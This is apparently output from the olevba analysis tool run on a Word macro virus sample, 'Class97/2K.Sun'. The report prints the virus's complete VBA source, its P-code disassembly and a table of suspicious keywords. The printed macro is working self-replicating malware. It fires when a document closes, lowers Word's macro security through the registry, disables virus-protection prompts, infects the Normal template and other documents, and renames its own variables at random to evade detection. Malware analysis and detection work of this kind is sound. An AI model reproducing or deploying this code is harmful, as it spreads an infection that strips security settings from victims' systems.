olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Pri.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Pri.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
Const Gt77314 = "9.0", Qi70845 = "Macro", Jh789373 = 3, Vg56948 = 0, Io76653 = &H1, Np297622 = 1
If Application.Version = Gt77314 Then
CommandBars(Qi70845).Controls(Jh789373).Enabled = (Rnd * Vg56948)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = Io76653
Else
Options.VirusProtection = (Rnd * Vg56948)
End If
Options.SaveNormalPrompt = (Rnd * Vg56948)
Set Ou279828 = ThisDocument.VBProject.VBComponents(Np297622).CodeModule
If MacroContainer = ActiveDocument Then Set Sn985910 = NormalTemplate.VBProject.VBComponents(Np297622).CodeModule Else Set Sn985910 = ActiveDocument.VBProject.VBComponents(Np297622).CodeModule: Sz542915 = (Rnd * Np297622)
If Ou279828.countoflines <> Sn985910.countoflines Then
Sn985910.deletelines Np297622, Sn985910.countoflines
Sn985910.insertlines Np297622, It160162(Ou279828.lines(Np297622, Ou279828.countoflines))
If Sz542915 <> Vg56948 Then ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Hour(Now()) Then
ActiveDocument.Shapes.AddShape(msoShapeSun, 160.05, 99.2, 342#, 117#).Select
With Selection
.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, Vg56948)
.ShapeRange.TextFrame.TextRange.Select
.TypeText Text:="Class97/2K.Sun" & Chr(11) & "by jackie twoflower" & Chr(11) & "Lz0NT/MVT"
.ParagraphFormat.Alignment = wdAlignParagraphCenter
End With
End If
End Sub
Private Function It160162(Cn693912) As String ' PVP v1.1
Const Vg56948 = 0, Np297622 = 1, Ek979243 = 21, Lx998675 = 22, An99102 = 65, Rt45295 = 122, It947978 = 999
Dim Oq412712(Np297622 To Ek979243)
Oq412712(1) = "Gt77314": Oq412712(2) = "Qi70845": Oq412712(3) = "Jh789373": Oq412712(4) = "Vg56948": Oq412712(5) = "Io76653": Oq412712(6) = "Np297622": Oq412712(7) = "Ou279828": Oq412712(8) = "Sn985910"
Oq412712(9) = "Ek979243": Oq412712(10) = "Lx998675": Oq412712(11) = "An99102": Oq412712(12) = "Rt45295": Oq412712(13) = "It947978": Oq412712(14) = "It160162": Oq412712(15) = "Oq412712": Oq412712(16) = "Hm207185"
Oq412712(17) = "My457904": Oq412712(18) = "Fi378289": Oq412712(19) = "Um627428": Oq412712(20) = "Cn693912": Oq412712(21) = "Sz542915"
For Hm207185 = Np297622 To Ek979243
My457904 = Chr(An99102 + Int(Rnd * Lx998675)) & Chr(Rt45295 - Int(Rnd * Lx998675)) & Int(Rnd * It947978) & Int(Rnd * It947978)
Fi378289 = Np297622
Um627428: Fi378289 = InStr(Fi378289 + Np297622, Cn693912, Oq412712(Hm207185))
If Fi378289 <> Vg56948 Then Cn693912 = Mid(Cn693912, Np297622, (Fi378289 - Np297622)) & My457904 & Mid(Cn693912, (Fi378289 + Len(Oq412712(Hm207185))), Len(Cn693912)): GoTo Um627428
Next
It160162 = Cn693912
End Function
' Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT
' Freedom will only be available through revolution or death...

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Pri.t
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5476 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0003 "9.0"
' 	VarDefn Gt77314
' 	LitStr 0x0005 "Macro"
' 	VarDefn Qi70845
' 	LitDI2 0x0003 
' 	VarDefn Jh789373
' 	LitDI2 0x0000 
' 	VarDefn Vg56948
' 	LitHI2 0x0001 
' 	VarDefn Io76653
' 	LitDI2 0x0001 
' 	VarDefn Np297622
' Line #4:
' 	Ld Application 
' 	MemLd Version 
' 	Ld Gt77314 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	Ld Rnd 
' 	Ld Vg56948 
' 	Mul 
' 	Paren 
' 	Ld Jh789373 
' 	Ld Qi70845 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	Ld Io76653 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	Ld Rnd 
' 	Ld Vg56948 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	Ld Rnd 
' 	Ld Vg56948 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	SetStmt 
' 	Ld Np297622 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Ou279828 
' Line #12:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Np297622 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Sn985910 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Np297622 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Sn985910 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld Np297622 
' 	Mul 
' 	Paren 
' 	St Sz542915 
' 	EndIf 
' Line #13:
' 	Ld Ou279828 
' 	MemLd countoflines 
' 	Ld Sn985910 
' 	MemLd countoflines 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	Ld Np297622 
' 	Ld Sn985910 
' 	MemLd countoflines 
' 	Ld Sn985910 
' 	ArgsMemCall deletelines 0x0002 
' Line #15:
' 	Ld Np297622 
' 	Ld Np297622 
' 	Ld Ou279828 
' 	MemLd countoflines 
' 	Ld Ou279828 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd It160162 0x0001 
' 	Ld Sn985910 
' 	ArgsMemCall insertlines 0x0002 
' Line #16:
' 	Ld Sz542915 
' 	Ld Vg56948 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld msoShapeSun 
' 	LitR8 0x999A 0x9999 0x0199 0x4064 
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x4058 
' 	LitR8 0x0000 0x0000 0x6000 0x4075 
' 	LitR8 0x0000 0x0000 0x4000 0x405D 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #20:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #21:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	Ld Vg56948 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #22:
' 	MemLdWith ShapeRange 
' 	MemLd TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #23:
' 	LitStr 0x000E "Class97/2K.Sun"
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "by jackie twoflower"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "Lz0NT/MVT"
' 	Concat 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #24:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #25:
' 	EndWith 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Private Function It160162(Cn693912, id_FFFE As String) As String)
' 	QuoteRem 0x002E 0x0009 " PVP v1.1"
' Line #29:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn Vg56948
' 	LitDI2 0x0001 
' 	VarDefn Np297622
' 	LitDI2 0x0015 
' 	VarDefn Ek979243
' 	LitDI2 0x0016 
' 	VarDefn Lx998675
' 	LitDI2 0x0041 
' 	VarDefn An99102
' 	LitDI2 0x007A 
' 	VarDefn Rt45295
' 	LitDI2 0x03E7 
' 	VarDefn It947978
' Line #30:
' 	Dim 
' 	Ld Np297622 
' 	Ld Ek979243 
' 	VarDefn Oq412712
' Line #31:
' 	LitStr 0x0007 "Gt77314"
' 	LitDI2 0x0001 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Qi70845"
' 	LitDI2 0x0002 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Jh789373"
' 	LitDI2 0x0003 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Vg56948"
' 	LitDI2 0x0004 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Io76653"
' 	LitDI2 0x0005 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Np297622"
' 	LitDI2 0x0006 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Ou279828"
' 	LitDI2 0x0007 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Sn985910"
' 	LitDI2 0x0008 
' 	ArgsSt Oq412712 0x0001 
' Line #32:
' 	LitStr 0x0008 "Ek979243"
' 	LitDI2 0x0009 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Lx998675"
' 	LitDI2 0x000A 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "An99102"
' 	LitDI2 0x000B 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Rt45295"
' 	LitDI2 0x000C 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "It947978"
' 	LitDI2 0x000D 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "It160162"
' 	LitDI2 0x000E 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Oq412712"
' 	LitDI2 0x000F 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Hm207185"
' 	LitDI2 0x0010 
' 	ArgsSt Oq412712 0x0001 
' Line #33:
' 	LitStr 0x0008 "My457904"
' 	LitDI2 0x0011 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Fi378289"
' 	LitDI2 0x0012 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Um627428"
' 	LitDI2 0x0013 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Cn693912"
' 	LitDI2 0x0014 
' 	ArgsSt Oq412712 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Sz542915"
' 	LitDI2 0x0015 
' 	ArgsSt Oq412712 0x0001 
' Line #34:
' 	StartForVariable 
' 	Ld Hm207185 
' 	EndForVariable 
' 	Ld Np297622 
' 	Ld Ek979243 
' 	For 
' Line #35:
' 	Ld An99102 
' 	Ld Rnd 
' 	Ld Lx998675 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rt45295 
' 	Ld Rnd 
' 	Ld Lx998675 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	Ld It947978 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	Ld It947978 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St My457904 
' Line #36:
' 	Ld Np297622 
' 	St Fi378289 
' Line #37:
' 	Label Um627428 
' 	Ld Fi378289 
' 	Ld Np297622 
' 	Add 
' 	Ld Cn693912 
' 	Ld Hm207185 
' 	ArgsLd Oq412712 0x0001 
' 	FnInStr3 
' 	St Fi378289 
' Line #38:
' 	Ld Fi378289 
' 	Ld Vg56948 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Cn693912 
' 	Ld Np297622 
' 	Ld Fi378289 
' 	Ld Np297622 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld My457904 
' 	Concat 
' 	Ld Cn693912 
' 	Ld Fi378289 
' 	Ld Hm207185 
' 	ArgsLd Oq412712 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld Cn693912 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Cn693912 
' 	BoS 0x0000 
' 	GoTo Um627428 
' 	EndIf 
' Line #39:
' 	StartForVariable 
' 	Next 
' Line #40:
' 	Ld Cn693912 
' 	St It160162 
' Line #41:
' 	EndFunc 
' Line #42:
' 	QuoteRem 0x0000 0x0041 " Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT"
' Line #43:
' 	QuoteRem 0x0000 0x003E " Freedom will only be available through revolution or death..."
' Line #44:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

